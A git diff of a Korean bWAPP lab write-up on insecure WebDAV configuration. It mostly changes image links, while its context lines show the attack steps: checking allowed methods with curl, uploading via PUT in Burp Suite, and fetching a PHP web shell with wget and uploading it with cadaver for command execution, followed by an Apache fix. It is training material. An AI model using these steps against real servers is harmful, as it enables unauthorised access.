@@ -42,15 +42,13 @@ title: "[bWAPP] 6. Security Misconfigurations - Insecure WebDAV Configuration"
 
 ### /webdav/
 
-![image-20211027015934535](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211027015934535.png)
-
 [WebDAV] 클릭 시 목록 확인 가능
 
-![image-20211027015132130](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/C%3A/Users/wjddj/EONION-TH3DB.github.io/imgimage-20211027015132130.png)
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/C%3A/Users/wjddj/EONION-TH3DB.github.io/imgimage-20211027015132130.png" alt="image-20211027015132130" style="zoom:80%;" />
 
 ### WebDav 사용 여부
 
-![image-20211027015102775](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/C%3A/Users/wjddj/EONION-TH3DB.github.io/imgimage-20211027015102775.png)
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/C%3A/Users/wjddj/EONION-TH3DB.github.io/imgimage-20211027015102775.png" alt="image-20211027015102775" style="zoom: 50%;" />
 
 - kali > msfdb start - 메타스플로잇 시작
 - kali > msfconsole 
@@ -63,7 +61,7 @@ title: "[bWAPP] 6. Security Misconfigurations - Insecure WebDAV Configuration"
 
 ### 허용하는  HTTP Method 확인
 
-<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015011438494.png" alt="image-20211015011438494" style="zoom: 50%;" />
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015011438494.png" alt="image-20211015011438494" style="zoom: 62%;" />
 
 - kali > curl -X OPTIONS http://비박스IP/webdav/ -i
 - /webdav/ 디렉토리에서 사용가능한 메소드 거의 대부분이라는 것 확인
@@ -72,7 +70,7 @@ title: "[bWAPP] 6. Security Misconfigurations - Insecure WebDAV Configuration"
 
 BurpSuit를 통해 /webdav/에 임의의 파일 업로드 해보자(PUT 메서드 사용)
 
-<img src="image-20211015012004733.png" alt="image-20211015012004733" style="zoom: 57%;" />
+<img src="image-20211027020328770.png" alt="image-20211027020328770" style="zoom:57%;" />
 
 - /webdav/ 페이지 패킷 잡음
 
@@ -80,17 +78,17 @@ BurpSuit를 통해 /webdav/에 임의의 파일 업로드 해보자(PUT 메서�
 
 GET -> PUT으로 변경
 
-<img src="image-20211015012959815.png" alt="image-20211015012959815" style="zoom:58%;" />
+<img src="image-20211027020419933.png" alt="image-20211027020419933" style="zoom:58%;" />
 
 - 내용 "<h1>Eonion</h1>"인 파일 업로드하기 위해 intecept off
 
 ### BurpSuite - 2
 
-<img src="image-20211015013128396.png" alt="image-20211015013128396" style="zoom: 80%;" />
+<img src="image-20211027020509300.png" alt="image-20211027020509300" style="zoom:80%;" />
 
 <img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211015013254384.png" alt="image-20211015013254384" style="zoom:80%;" />
 
-<img src="image-20211015013322950.png" alt="image-20211015013322950" style="zoom:104%;" />
+<img src="image-20211027020551268.png" alt="image-20211027020551268" style="zoom:103%;" />
 
 - PUT 메서드를 통해 웹 서버에 파일 업로드 가능
 
@@ -98,7 +96,7 @@ GET -> PUT으로 변경
 
 칼리를 이용해 악의적인 파일 업로드 해보자
 
-<img src="image-20211015014551802.png" alt="image-20211015014551802" style="zoom: 65%;" />
+<img src="image-20211027020647102.png" alt="image-20211027020647102" style="zoom:65%;" />
 
 - Kali > wget [https://raw.githubusercontent.com/Wphackedhelp/php-webshells/master/PHP%20Shell.php](https://raw.githubusercontent.com/Wphackedhelp/php-webshells/master/PHP Shell.php) - 코드 다운로드
 - Kali >  cadaver http://비박스IP/webdav/ - 'Webdav' 클라이언트인 'cadaver' 사용
@@ -106,7 +104,7 @@ GET -> PUT으로 변경
 
 ### Kali - 1
 
-<img src="image-20211015014839719.png" alt="image-20211015014839719" style="zoom: 80%;" />
+<img src="image-20211027020729687.png" alt="image-20211027020729687" style="zoom:82%;" />
 
 - 웹 쉘을 통해 서버에 명령 수행 가능
 
@@ -114,7 +112,7 @@ GET -> PUT으로 변경
 
 아파치 설정 파일
 
-<img src="image-20211015015554425.png" alt="image-20211015015554425" style="zoom: 69%;" />
+<img src="image-20211027020807487.png" alt="image-20211027020807487" style="zoom:72%;" />
 
 - bee-box > sudo -s 
 - bee-box > vi /etc/apache2/httpd.conf - 아파치 설정 파일
@@ -149,6 +147,6 @@ GET -> PUT으로 변경
 
 ### 확인 - curl
 
-<img src="image-20211015025611571.png" alt="image-20211015025611571" style="zoom:58%;" />
+<img src="image-20211027020908377.png" alt="image-20211027020908377" style="zoom:58%;" />
 
 - 위에서 HTTP 메소드를 알아내기 위해 사용했던 curl을 이용시 401 오류와 인증을 요구
